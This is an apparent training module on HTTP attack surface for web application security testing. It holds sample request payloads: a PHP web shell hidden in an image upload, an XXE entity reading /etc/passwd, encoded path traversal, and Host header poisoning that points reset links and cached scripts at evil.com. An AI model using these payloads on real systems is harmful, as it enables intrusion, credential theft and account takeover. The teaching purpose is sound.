# HTTP Protocol Deep Dive

## 1. Orientation

### What this module covers
This module examines HTTP from an attacker's perspective. Every component of an HTTP request—method, headers, body, encoding—is potential attack surface. Understanding HTTP at the protocol level is essential for web application security testing.

### Fit in the Learning Path
Web application hacking is fundamentally about sending HTTP requests the application doesn't expect. You must understand what "normal" looks like before you can craft "malicious."

### Learning Objectives
By the end of this module, you will:
*   Understand HTTP request/response structure in detail
*   Identify attack vectors in each HTTP component
*   Apply manipulation techniques (verb tampering, header injection)
*   Use encoding and decoding for attack payloads

---

## 2. Core Content

### Mental Model: HTTP as Attack Surface

**How professionals think about this:**
Every byte of an HTTP request is potentially attacker-controlled input. The method, path, headers, cookies, and body are all attack vectors. Understanding the protocol deeply reveals where security assumptions can be exploited.

```
HTTP REQUEST ANATOMY - ATTACK SURFACE:

┌──────────────────────────────────────────────────────────────────────┐
│ POST /api/users/1/update HTTP/1.1                                    │
│ └─┬─┘ └───────┬────────┘ └──┬────┘                                   │
│   │           │              │                                       │
│   │           │              └── Version (rarely attacked)           │
│   │           └── Path/URI                                           │
│   │               - Path traversal: ../../etc/passwd                 │
│   │               - Parameter injection: ?id=1;DROP TABLE           │
│   │               - Encoding: %2e%2e%2f for ../                      │
│   │                                                                  │
│   └── Method                                                         │
│       - Verb tampering: GET→PUT, GET→DELETE                         │
│       - Method override: X-HTTP-Method-Override                      │
│                                                                      │
│ Host: api.example.com                                                │
│ │                                                                    │
│ └── Host Header                                                      │
│     - Password reset poisoning                                       │
│     - Cache poisoning                                                │
│     - SSRF via Host manipulation                                     │
│                                                                      │
│ Cookie: session=abc123; role=user                                    │
│ │                                                                    │
│ └── Cookies                                                          │
│     - Session hijacking                                              │
│     - Role/privilege tampering                                       │
│     - Cookie injection                                               │
│                                                                      │
│ Content-Type: application/json                                       │
│ │                                                                    │
│ └── Content-Type                                                     │
│     - MIME confusion attacks                                         │
│     - XXE via XML content-type                                       │
│                                                                      │
│ Authorization: Bearer eyJhbGc...                                     │
│ │                                                                    │
│ └── Auth Headers                                                     │
│     - JWT attacks                                                    │
│     - Basic auth decode                                              │
│                                                                      │
│ X-Forwarded-For: 10.0.0.1                                            │
│ │                                                                    │
│ └── Proxy Headers                                                    │
│     - IP spoofing                                                    │
│     - Access control bypass                                          │
│                                                                      │
│ {"user_id": 5, "role": "admin"}                                      │
│ │                                                                    │
│ └── Body                                                             │
│     - Mass assignment                                                │
│     - JSON injection                                                 │
│     - Deserialization attacks                                        │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

### HTTP Methods (Verb Tampering)

**Standard methods and their abuse:**

| Method | Intended Use | Attack Vector |
|--------|--------------|---------------|
| **GET** | Retrieve data | Parameter manipulation, caching poisoning |
| **POST** | Submit data | Body manipulation, CSRF |
| **PUT** | Replace resource | Unauthorized file upload |
| **DELETE** | Remove resource | Unauthorized deletion |
| **PATCH** | Partial update | Mass assignment |
| **HEAD** | Headers only | Bypass GET restrictions |
| **OPTIONS** | Discover methods | Information disclosure |
| **TRACE** | Debug/echo | XST (Cross-Site Tracing) |

**Verb tampering attack:**

```http
ORIGINAL REQUEST:
GET /admin/delete?id=5 HTTP/1.1
Cookie: role=user

RESPONSE: 403 Forbidden

TAMPERED REQUEST (Method):
POST /admin/delete?id=5 HTTP/1.1
Cookie: role=user

RESPONSE: 200 OK (Developer only blocked GET)

WHY THIS WORKS:
- Developer checks: if (method == "GET" && role != "admin") deny
- Forgot: if (method == "POST" && role != "admin") deny
```

**Method override headers:**

```http
# Some frameworks accept method override
POST /resource HTTP/1.1
X-HTTP-Method-Override: DELETE
# OR
X-Method-Override: PUT
# OR
_method=DELETE in body
```

### Host Header Attacks

**Password reset poisoning:**

```
ATTACK FLOW:

1. Attacker requests password reset for victim
   POST /reset-password HTTP/1.1
   Host: evil.com        ← Attacker-controlled
   
   {"email": "victim@company.com"}

2. Server generates reset link using Host header:
   "http://evil.com/reset?token=SECRET123"

3. Victim clicks link from email → Goes to evil.com
   → Attacker captures token

4. Attacker uses token on real site
```

**Web cache poisoning:**

```http
# Cache servers key on URL, but application uses Host
GET / HTTP/1.1
Host: evil.com

# Response cached with:
<script src="http://evil.com/payload.js">

# Next user requesting / gets poisoned response
```

### Header Injection

**Dangerous headers:**

```http
X-Forwarded-For: 127.0.0.1
# Spoof IP for access control bypass
# Application trusts this header for "is_admin" check

X-Forwarded-Host: evil.com
# Alternative to Host header manipulation

X-Original-URL: /admin
X-Rewrite-URL: /admin
# URL rewrite bypass for restricted paths

Referer: https://admin.company.com
# Bypass referrer-based access control
```

### Content-Type Confusion

**Upload bypass via Content-Type:**

```http
# Upload malicious.php but claim it's an image

POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png    ← Lie about content type

<?php system($_GET['cmd']); ?>
------Boundary--

# If server only checks Content-Type header:
# File uploaded and executed
```

**XXE via Content-Type:**

```http
# Force XML parsing by changing Content-Type

POST /api/user HTTP/1.1
Content-Type: application/xml    ← Changed from application/json

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>
```

### URL Encoding

**Essential encodings:**

| Character | Encoded | Common Use |
|-----------|---------|------------|
| Space | %20 or + | Parameter values |
| / | %2F | Path traversal bypass |
| . | %2E | Extension bypass |
| < | %3C | XSS bypass |
| > | %3E | XSS bypass |
| ' | %27 | SQLi bypass |
| " | %22 | Injection bypass |
| NULL | %00 | Null byte injection |

**Double encoding:**

```
BYPASS SCENARIO:

Normal: ../../../etc/passwd
Blocked: WAF sees "../" pattern

Single encode: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
Blocked: WAF decodes once, still sees "../"

Double encode: %252e%252e%252f
              └── % = %25, . = 2e, / = 2f
              
WAF decodes once: %2e%2e%2f (looks like encoded data, passes)
Application decodes: ../      (path traversal achieved)
```

### Request Smuggling

**HTTP Desync (advanced):**

```
CONCEPT:

Frontend (CDN/Proxy) and Backend disagree on request boundaries

Frontend sees:        Backend sees:
┌─────────────┐       ┌─────────────┐
│ Request 1   │       │ Request 1   │
├─────────────┤       │ (partial)   │
│ Request 2   │       ├─────────────┤
└─────────────┘       │ Request 2   │
                      │ = Smuggled! │
                      └─────────────┘

Caused by inconsistent parsing of:
- Content-Length vs Transfer-Encoding
- Malformed headers
```

### HTTPS Misconception

**What HTTPS protects (and doesn't):**

```
HTTPS PROTECTION:

                    HTTPS Tunnel
Browser ───────────[encrypted]────────── Server
    │                                      │
    │ Burp Suite here                      │
    │ (on your machine)                    │
    ▼                                      ▼
Request visible                     Request processed
Request modifiable                  All input trusted

HTTPS encrypts data IN TRANSIT
HTTPS does NOT protect against:
- Malicious input from client
- Parameter manipulation
- Header injection
- Any application-layer attack

You (attacker) sit BEFORE encryption on YOUR machine
```

---

## 3. Guided Practice

### Exercise 1: Request Analysis

Analyze this request and identify attack surfaces:

```http
POST /api/v1/user/update HTTP/1.1
Host: api.example.com
Cookie: session=abc123; admin=false
Content-Type: application/json
X-Forwarded-For: 192.168.1.1

{"id": 5, "role": "user", "email": "test@test.com"}
```

| Component | Attack Vector |
|-----------|---------------|
| Method | ___ |
| Host | ___ |
| Cookie | ___ |
| Body | ___ |
| X-Forwarded-For | ___ |

### Exercise 2: Encoding Practice

Encode these payloads:

| Payload | URL Encoded |
|---------|-------------|
| `../../../etc/passwd` | ___ |
| `<script>alert(1)</script>` | ___ |
| `' OR 1=1--` | ___ |

### Exercise 3: Verb Tampering

A `/delete` endpoint returns 403 for GET. What methods would you try?

1. ___
2. ___
3. ___

---

## 4. Reflection Check

### Protocol Understanding
1. Why can you modify every HTTP header even over HTTPS?

2. A server uses the Host header to build links. What attacks does this enable?

3. Why might POST bypass the same security check that blocks GET?

### Attack Thinking
1. A WAF blocks `../` in paths. What technique might bypass this?

2. The application accepts JSON by default. You want to trigger XXE. How?

3. Access control is based on IP address from X-Forwarded-For. Exploit this.

---

## 5. Key Misconceptions

**MYTH: "HTTPS prevents me from modifying requests"**
REALITY: You control your machine. HTTPS encrypts between YOUR machine and the server. On your machine, you see everything.

**MYTH: "Only the body contains user input"**
REALITY: Method, path, every header, cookies—all attacker-controlled.

**MYTH: "Browsers limit what HTTP requests can be sent"**
REALITY: Browsers limit some things, but Burp/curl have no limits. Test the server, not the browser.

**MYTH: "URL encoding is security"**
REALITY: URL encoding is transport mechanism. The server decodes it before processing.

**MYTH: "Only the documented API endpoints are accessible"**
REALITY: Try all methods on all paths. Try undocumented paths. Test everything.

---

## 6. Completion Criteria

This module is complete when you can:

1. **Identify** attack vectors in each HTTP component
2. **Apply** verb tampering techniques
3. **Execute** header injection attacks conceptually
4. **Use** encoding to bypass filters
5. **Explain** why HTTPS doesn't prevent HTTP manipulation

---

## 7. Further Depth (Optional)

*   **Tool:** Practice with Burp Suite Repeater
*   **Research:** HTTP Request Smuggling techniques
*   **Practice:** PortSwigger Web Security Academy HTTP labs
*   **Reading:** RFC 7230-7235 (HTTP/1.1 specification)
